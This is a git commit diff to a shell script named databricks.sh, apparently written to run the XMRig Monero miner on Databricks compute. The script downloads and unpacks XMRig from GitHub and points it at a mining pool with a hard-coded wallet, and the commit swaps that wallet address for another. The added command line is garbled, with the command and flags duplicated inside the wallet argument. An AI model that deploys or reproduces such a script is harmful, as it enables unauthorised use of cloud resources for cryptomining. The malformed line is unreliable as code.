51d26f020a735289687524347df7ca5bcc409488
sendmailtoahmad <102340440+sendmailtoahmad@users.noreply.github.com>
2022-05-10 08:04:31 -0700

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
 tar xvzf xmrig-6.16.4-focal-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id aank
+./xmrig -o us-west.minexmr.com:443 -u ./xmrig -o us-west.minexmr.com:443 -u 4ALJ2jaCe7HCXWRnxzjPm3NXMebwJQK3mUnfaZyZAUPDZKcBLBkjJZbPVshD2d92LyheeLR8uCD1GTJf1mPiFZtG3KyateV -k --tls --rig-id aank -k --tls --rig-id aank
